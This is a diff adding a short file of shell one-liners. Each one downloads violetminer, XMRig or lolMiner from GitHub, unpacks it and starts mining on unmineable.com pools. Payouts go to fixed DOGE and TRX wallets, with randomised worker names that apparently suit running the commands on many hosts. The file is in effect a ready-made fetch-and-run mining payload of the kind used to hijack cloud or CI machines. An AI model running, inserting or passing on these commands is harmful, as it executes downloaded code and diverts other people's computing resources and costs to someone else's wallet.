@@ -1,0 +1,18 @@
+VIOLETMINER
+
+wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -zxf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool rx.unmineable.com:3333 --username TRX:TQTbjGFzERMTQZXUtLih2BroBXVLt5yHE5.$(echo $(shuf -i 1000-9999 -n 1)-trx)#iuow-9gb1 --password DD --algorithm chukwa
+
+wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -zxf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool rx.unmineable.com:3333 --username DOGE:D6wp99SMdCdcmk6h93V1w8Qad5kjPw84PR.$(echo $(shuf -i 1000-9999 -n 1)-DOGE)#2hhd-euvq --password DD --algorithm chukwa
+
+XMRIG
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz && tar -xvf xmrig-6.13.1-linux-x64.tar.gz && cd xmrig-6.13.1 && ./xmrig -o rx.unmineable.com:13333 -a rx -k-u DOGE:D6wp99SMdCdcmk6h93V1w8Qad5kjPw84PR.$(echo $(shuf -i 1000-9999 -n 1)-DOGE)#2hhd-euvq
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz && tar -xvf xmrig-6.13.1-linux-x64.tar.gz && cd xmrig-6.13.1 && ./xmrig -o rx.unmineable.com:13333 -a rx -k-u TRX:TQTbjGFzERMTQZXUtLih2BroBXVLt5yHE5.$(echo $(shuf -i 1000-9999 -n 1)-TRX)#iuow-9gb1
+
+LOLMINER
+
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DOGE:D6wp99SMdCdcmk6h93V1w8Qad5kjPw84PR.$(echo $(shuf -i 1000-9999 -n 1)-DOGE)#2hhd-euvq --ethstratum ETHPROXY
+
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TQTbjGFzERMTQZXUtLih2BroBXVLt5yHE5.$(echo $(shuf -i 1000-9999 -n 1)-trx)#iuow-9gb1 --ethstratum ETHPROXY
+
